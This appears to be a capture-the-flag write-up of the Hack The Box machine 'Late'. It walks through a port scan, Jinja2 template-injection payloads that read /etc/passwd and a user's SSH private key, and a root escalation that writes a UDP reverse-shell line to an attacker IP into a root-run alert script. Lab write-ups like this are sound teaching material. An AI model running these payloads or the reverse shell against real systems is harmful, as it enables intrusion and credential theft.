---
layout: single
title: Late - Hack The Box
excerpt: "Late is a easy Linux machine, we start this machine by going into the web page, there we will find a redirect to images.late.htb. On this page we will find that its a image to text converter with flask meaning that the software behing it is Jinja2. We found a SSTI on the file upload that let you read the id_rsa of svc_acc. Finally we are able to get root by using the file ssh-alert.sh "
date: 2023-02-13
classes: wide
header:
  teaser: /assets/images/htb-writeup-Late/Late-Logo.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - hackthebox
  - infosec
tags:
  - easy
  - Linux
  - SSTI 
  - Jinja2
  - Flask 

---

![](/assets/images/htb-writeup-Late/Late-Logo.png)

### Machine IP = 10.10.11.156

## Port Scan

We start with the NMAP scan:
* sudo nmap -sS -sV -sC -p- -vvv -oA nmap/allPorts 10.10.11.156

```
# Nmap 7.93 scan initiated Tue Jan 31 15:14:48 2023 as: nmap -sS -sV -sC -p- -vvv -oA nmap/allPorts 10.10.11.156
Nmap scan report for 10.10.11.156
Host is up, received echo-reply ttl 63 (0.056s latency).
Scanned at 2023-01-31 15:14:49 EST for 117s
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 025e290ea3af4e729da4fe0dcb5d8307 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDSqIcUZeMzG+QAl/4uYzsU98davIPkVzDmzTPOmMONUsYleBjGVwAyLHsZHhgsJqM9lmxXkb8hT4ZTTa1azg4JsLwX1xKa8m+RnXwJ1DibEMNAO0vzaEBMsOOhFRwm5IcoDR0gOONsYYfz18pafMpaocitjw8mURa+YeY21EpF6cKSOCjkVWa6yB+GT8mOcTZOZStRXYosrOqz5w7hG+20RY8OYwBXJ2Ags6HJz3sqsyT80FMoHeGAUmu+LUJnyrW5foozKgxXhyOPszMvqosbrcrsG3ic3yhjSYKWCJO/Oxc76WUdUAlcGxbtD9U5jL+LY2ZCOPva1+/kznK8FhQN
|   256 41e1fe03a5c797c4d51677f3410ce9fb (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBBMen7Mjv8J63UQbISZ3Yju+a8dgXFwVLgKeTxgRc7W+k33OZaOqWBctKs8hIbaOehzMRsU7ugP6zIvYb25Kylw=
|   256 28394698171e461a1ea1ab3b9a577048 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIIGrWbMoMH87K09rDrkUvPUJ/ZpNAwHiUB66a/FKHWrj
80/tcp open  http    syn-ack ttl 63 nginx 1.14.0 (Ubuntu)
|_http-favicon: Unknown favicon MD5: 1575FDF0E164C3DB0739CF05D9315BDF
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-title: Late - Best online image tools
|_http-server-header: nginx/1.14.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Enumeration 

From the scan the clear option is to go to the web server (port 80) and after investigating it we are able to find a redirect link on it

![](/assets/images/htb-writeup-Late/Late-1.png)

Then we need to add ***images.late.htb*** to /etc/hosts and now we are able to get to the page:

![](/assets/images/htb-writeup-Late/Late-2.png)

We find a new page that is a image to text converter with [flask](https://pythonbasics.org/what-is-flask-python/) thus most likely this is running on Jinja2. If we look online for flask and jinja2 exploits we can see that the first thing that pop-up is SSTI.

## Gaining foothold

We start checking the photo to text conversion and it does change whatever we see on the picture. Now we try to upload a new picture writting the following basic SSTI:

* {{7*7}}


When we download the ***result.txt*** file we can see that the basic injection of 7 * 7 is "processed" and its showing the result of the injection

![](/assets/images/htb-writeup-Late/Late-3.png)

after trying multiple injections, multiple backgrounds and multiple fonts to make the injection work we are able to read the **/etc/passwd** file

* {{get_flashed_messages.__globals__.__builtins__.open("/etc/passwd").read()}}


![](/assets/images/htb-writeup-Late/Late-4.png)

From the same we can we that the only possible user appart from root that we can attack is **svc_acc**

![](/assets/images/htb-writeup-Late/Late-5.png)


Now that we know the user we can try to get its id_rsa key in case it is created

* {{get_flashed_messages.__globals__.__builtins__.open("/home/svc_acc/.ssh/id_rsa").read()}}

![](/assets/images/htb-writeup-Late/Late-6.png)


with the id_rsa key and the username for sure we can now login to the machine using the **-i** flag on ssh, and we are able to get **user.txt** flag.
![](/assets/images/htb-writeup-Late/Late-7.png)


## Privilege Escalation 

We start looking for any interesting files that might belong to svc_acc that could lead us to some sort of privilege escalation 
```
find / -user svc_acc 2>/dev/null | grep -v -E 'sys|proc|run|home' 
```
![](/assets/images/htb-writeup-Late/Late-8.png)

![](/assets/images/htb-writeup-Late/Late-9.png)

if we look at the file ssh-alert.sh it is basically a file in which the recipient is ROOT and investigating about it all that is is going to do is to send an alert to the user ***when a login or a logout***  is happening on the system.

```
#!/bin/bash

RECIPIENT="root@late.htb"
SUBJECT="Email from Server Login: SSH Alert"

BODY="
A SSH login was detected.

        User:        $PAM_USER
        User IP Host: $PAM_RHOST
        Service:     $PAM_SERVICE
        TTY:         $PAM_TTY
        Date:        `date`
        Server:      `uname -a`
"

if [ ${PAM_TYPE} = "open_session" ]; then
        echo "Subject:${SUBJECT} ${BODY}" | /usr/sbin/sendmail ${RECIPIENT}
fi
```

To get root access/privileges what we need to do is to add a reverse bash shell line to the existing ssh-alert.sh file and then trigger the alert. First we add the command at the end of the file.

```
echo 'sh -i >& /dev/udp/10.10.14.5/443 0>&1' > /usr/local/sbin/ssh-alert.sh
```

now we trigger the alert and our open nc should has root sheell

![](/assets/images/htb-writeup-Late/Late-10.png)